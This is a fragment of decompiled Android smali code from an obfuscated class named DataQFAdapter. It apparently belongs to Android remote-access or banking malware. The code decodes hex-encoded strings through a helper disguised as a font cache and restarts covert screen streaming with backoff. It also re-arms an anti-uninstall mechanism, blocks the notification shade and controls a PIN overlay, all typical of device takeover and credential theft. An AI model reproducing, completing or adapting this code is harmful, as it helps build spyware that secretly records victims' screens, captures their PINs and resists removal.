    invoke-static {v6, v7}, Ljava/lang/Thread;->sleep(J)V
    :try_end_4
    .catch Ljava/lang/InterruptedException; {:try_start_4 .. :try_end_4} :catch_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    .line 582
    .line 583
    .line 584
    goto/16 :goto_4

    .line 585
    .line 586
    :goto_9
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 587
    .line 588
    .line 589
    const-string v6, "001000750049008200F500B1009200B400370064005E008600FD00FF00D700B500310079004900DD00B0"

    .line 590
    .line 591
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 592
    .line 593
    .line 594
    invoke-virtual {v4}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 595
    .line 596
    .line 597
    sget-object v6, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 598
    .line 599
    invoke-virtual {v6}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 600
    .line 601
    .line 602
    invoke-static {v5}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setH264CaptureInFlight$cp(Z)V

    .line 603
    .line 604
    .line 605
    iget v6, v1, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 606
    .line 607
    add-int/2addr v6, v2

    .line 608
    iput v6, v1, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 609
    .line 610
    invoke-virtual {v4}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 611
    .line 612
    .line 613
    move-result-object v4

    .line 614
    if-eqz v4, :cond_14

    .line 615
    .line 616
    sget-object v6, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 617
    .line 618
    invoke-virtual {v4, v6}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 619
    .line 620
    .line 621
    move-result-object v4

    nop

    nop

    .line 622
    const-string v6, "0021007F0055008300F500AD"

    .line 623
    .line 624
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 625
    .line 626
    .line 627
    move-result-object v6

    .line 628
    invoke-static {v4, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 629
    .line 630
    .line 631
    move-result v6

    .line 632
    if-nez v6, :cond_15

    .line 633
    .line 634
    const-string v6, "00270073005A008300FF00BD00D800A200200062"

    .line 635
    .line 636
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 637
    .line 638
    .line 639
    move-result-object v6

    .line 640
    invoke-static {v4, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 641
    .line 642
    .line 643
    move-result v6

    .line 644
    if-nez v6, :cond_15

    .line 645
    .line 646
    const-string v6, "003000730058009200E200B600C600BE"

    .line 647
    .line 648
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 649
    .line 650
    .line 651
    move-result-object v6

    .line 652
    invoke-static {v4, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 653
    .line 654
    .line 655
    move-result v6

    .line 656
    if-nez v6, :cond_15

    .line 657
    .line 658
    const-string v6, "002C00790056"

    .line 659
    .line 660
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 661
    .line 662
    .line 663
    move-result-object v6

    nop

    nop

    .line 664
    invoke-static {v4, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 665
    .line 666
    .line 667
    move-result v6

    .line 668
    if-nez v6, :cond_15

    .line 669
    .line 670
    const-string v6, "003100730056008800E400BA"

    .line 671
    .line 672
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 673
    .line 674
    .line 675
    move-result-object v6

    .line 676
    invoke-static {v4, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 677
    .line 678
    .line 679
    move-result v6

    .line 680
    if-nez v6, :cond_15

    .line 681
    .line 682
    const-string v6, "003300640054008400F500AC00C100AE002D0071"

    .line 683
    .line 684
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 685
    .line 686
    .line 687
    move-result-object v6

    .line 688
    invoke-static {v4, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 689
    .line 690
    .line 691
    move-result v4

    .line 692
    if-eqz v4, :cond_14

    .line 693
    .line 694
    goto/16 :goto_a

    .line 695
    :cond_14
    move/from16 v4, v5

    nop

    .line 696
    goto/16 :goto_b

    .line 697
    :cond_15
    :goto_a
    move/from16 v4, v2

    .line 698
    :goto_b
    if-eqz v4, :cond_a

    .line 699
    .line 700
    iget v4, v1, Lv/s/g78iUtGnOvef;->w9sT1Swbhx3hs:I

    .line 701
    .line 702
    if-le v4, v3, :cond_a

    .line 703
    .line 704
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 705
    .line 706
    .line 707
    const-string v0, "00170079005400C700FD00BE00DC00BE006300730049009500FF00AD00C100E7006B"

    .line 708
    .line 709
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 710
    .line 711
    .line 712
    const-string v0, "006A003A001B008600E400AB00D700AA003300620052008900F700FF00C000A200200079004D008200E200A6"

    nop

    nop

    .line 713
    .line 714
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 715
    .line 716
    .line 717
    :catch_4
    :cond_16
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 718
    .line 719
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 720
    .line 721
    .line 722
    invoke-static {v5}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setH264CaptureInFlight$cp(Z)V

    .line 723
    .line 724
    .line 725
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 726
    .line 727
    .line 728
    const-string v0, "001000620049008200F100B200DB00A9002400360048009300FF00AF00C200A20027003A001B"

    .line 729
    .line 730
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 731
    .line 732
    .line 733
    const-string v0, "006300700049008600FD00BA00C100E700370079004F008600FC00F3009200A2003100640054009500E300E2"

    .line 734
    .line 735
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 736
    .line 737
    .line 738
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$isScreenStreaming$cp()Z

    .line 739
    .line 740
    .line 741
    move-result v0

    .line 742
    const/16 v1, 0xa

    nop

    .line 743
    .line 744
    if-eqz v0, :cond_18

    .line 745
    .line 746
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getStreamRestartCount$cp()I

    .line 747
    .line 748
    .line 749
    move-result v0

    .line 750
    if-ge v0, v1, :cond_18

    .line 751
    .line 752
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getStreamRestartCount$cp()I

    .line 753
    .line 754
    .line 755
    move-result v0

    .line 756
    const/16 v1, 0x2e

    add-int/lit8 v1, v1, -0x2a

    .line 757
    invoke-static {v0, v1}, Ljava/lang/Math;->min(II)I

    .line 758
    .line 759
    .line 760
    move-result v0

    .line 761
    const-wide/16 v3, 0x1

    .line 762
    .line 763
    shl-long v0, v3, v0

    .line 764
    .line 765
    const-wide/16 v3, 0x7d0

    .line 766
    .line 767
    mul-long/2addr v0, v3

    .line 768
    const-wide/16 v3, 0x7530

    .line 769
    .line 770
    invoke-static {v0, v1, v3, v4}, Ljava/lang/Math;->min(JJ)J

    .line 771
    .line 772
    .line 773
    move-result-wide v0

    .line 774
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 775
    .line 776
    .line 777
    move-result-wide v3

    .line 778
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getLastStreamRestartMs$cp()J

    .line 779
    .line 780
    .line 781
    move-result-wide v5

    .line 782
    sub-long v5, v3, v5

    .line 783
    .line 784
    cmp-long v5, v5, v0

    .line 785
    .line 786
    if-gez v5, :cond_17

    .line 787
    .line 788
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 789
    .line 790
    .line 791
    const-string v0, "001000620049008200F100B2009200B500260065004F008600E200AB009200A4002C00790057008300FF00A800DC00E7006B"

    .line 792
    .line 793
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 794
    .line 795
    .line 796
    const-string v0, "002E0065001200CB00B000AC00D900AE003300660052008900F7"

    .line 797
    .line 798
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 799
    .line 800
    .line 801
    goto/16 :goto_c

    .line 802
    :cond_17
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getStreamRestartCount$cp()I

    .line 803
    .line 804
    .line 805
    move-result v5

    .line 806
    add-int/2addr v5, v2

    .line 807
    invoke-static {v5}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setStreamRestartCount$cp(I)V

    .line 808
    .line 809
    .line 810
    invoke-static {v3, v4}, Lapp/mobilex/plus/services/DataQFAdapter;->access$setLastStreamRestartMs$cp(J)V

    .line 811
    .line 812
    .line 813
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 814
    .line 815
    .line 816
    const-string v2, "00020063004F008800BD00AD00D700B4003700770049009300F900B100D500E7003000750049008200F500B1009200B400370064005E008600FD00FF009A00A600370062005E008A00E000AB0092"

    .line 817
    .line 818
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 819
    .line 820
    .line 821
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getStreamRestartCount$cp()I

    .line 822
    .line 823
    .line 824
    const-string v2, "006F00360059008600F300B400DD00A10025002B"

    .line 825
    .line 826
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 827
    .line 828
    .line 829
    const-string v2, "002E00650012"

    .line 830
    .line 831
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 832
    .line 833
    .line 834
    :try_start_5
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_5
    .catch Ljava/lang/InterruptedException; {:try_start_5 .. :try_end_5} :catch_5

    .line 835
    .line 836
    .line 837
    :catch_5
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 838
    .line 839
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 840
    .line 841
    .line 842
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$isScreenStreaming$cp()Z

    .line 843
    .line 844
    .line 845
    move-result v0

    .line 846
    if-eqz v0, :cond_19

    .line 847
    .line 848
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->dQC4QhgRN3MSEAP3HW0()V

    .line 849
    .line 850
    .line 851
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->is7XW2V21HfKv7MihWy()V

    .line 852
    .line 853
    .line 854
    goto :goto_c

    .line 855
    :cond_18
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getStreamRestartCount$cp()I

    .line 856
    .line 857
    .line 858
    move-result v0

    .line 859
    if-lt v0, v1, :cond_19

    .line 860
    .line 861
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 862
    .line 863
    .line 864
    const-string v0, "000E0077004300C700E300AB00C000A20022007B001B009500F500AC00C600A600310062004800C700E200BA00D300A4002B0073005F00C700B8"

    .line 865
    .line 866
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 867
    .line 868
    .line 869
    const-string v0, "006A003A001B008000F900A900DB00A900240036004E0097"

    .line 870
    .line 871
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 872
    .line 873
    .line 874
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->dQC4QhgRN3MSEAP3HW0()V

    .line 875
    .line 876
    .line 877
    :cond_19
    :goto_c
    return-void

    .line 878
    :pswitch_12
    :try_start_6
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 879
    .line 880
    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 881
    .line 882
    .line 883
    invoke-static {}, Lv/s/GARjgaGEpTotOxcl8vfe;->l1V0lQr6TbwNKqHfXNbb()Z

    .line 884
    .line 885
    .line 886
    move-result v0

    .line 887
    if-eqz v0, :cond_1b

    .line 888
    .line 889
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 890
    .line 891
    .line 892
    move-result-object v0

    .line 893
    if-eqz v0, :cond_1a

    .line 894
    .line 895
    invoke-virtual {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->rearmAntiUninstall()V

    .line 896
    .line 897
    .line 898
    goto/16 :goto_d

    .line 899
    :catchall_1
    move-exception v0

    nop

    nop

    .line 900
    goto/16 :goto_e

    .line 901
    :cond_1a
    :goto_d
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getUIBlock_Shade$cp()Z

    .line 902
    .line 903
    .line 904
    move-result v0

    .line 905
    if-eqz v0, :cond_1b

    .line 906
    .line 907
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 908
    .line 909
    .line 910
    move-result-object v0

    nop

    nop

    .line 911
    if-eqz v0, :cond_1b

    .line 912
    .line 913
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$addShadeBarrier(Lapp/mobilex/plus/services/DataQFAdapter;)V
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_1

    .line 914
    .line 915
    .line 916
    goto :goto_f

    .line 917
    :goto_e
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 918
    .line 919
    .line 920
    const-string v1, "00310073005A009500FD00FF00D700B500310079004900DD00B0"

    .line 921
    .line 922
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 923
    .line 924
    .line 925
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 926
    .line 927
    .line 928
    :cond_1b
    :goto_f
    return-void

    .line 929
    :pswitch_13
    sget-object v0, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 930
    .line 931
    invoke-virtual {v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->Qrz92kRPw4GcghAc()V

    .line 932
    .line 933
    .line 934
    return-void

    .line 935
    :pswitch_14
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 936
    .line 937
    .line 938
    move-result-object v0

    nop

    .line 939
    if-eqz v0, :cond_1c

    .line 940
    .line 941
    invoke-virtual {v0, v5}, Lapp/mobilex/plus/services/DataQFAdapter;->setPinOverlayTouchable$app_release(Z)V

    .line 942
    .line 943
    .line 944
    :cond_1c
    return-void

    .line 945
    :pswitch_15
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->MLSIo1htfMPWeB8V876L()V

    .line 946
    .line 947
    .line 948
    return-void

    nop

    .line 949
    :pswitch_16
    invoke-static {}, Lv/s/wbK4wnGaII4TwWEYqb;->JXn4Qf7zpnLjP5()V

    .line 950
    .line 951
    .line 952
    return-void

    .line 953
    :pswitch_17
    sget v0, Lcom/google/android/datatransport/runtime/scheduling/jobscheduling/AlarmManagerSchedulerBroadcastReceiver;->dDIMxZXP1V8HdM:I

    .line 954
    .line 955
    return-void

    nop

    .line 956
    .line 957
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_17
        :pswitch_16
        :pswitch_15
        :pswitch_14
        :pswitch_13
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
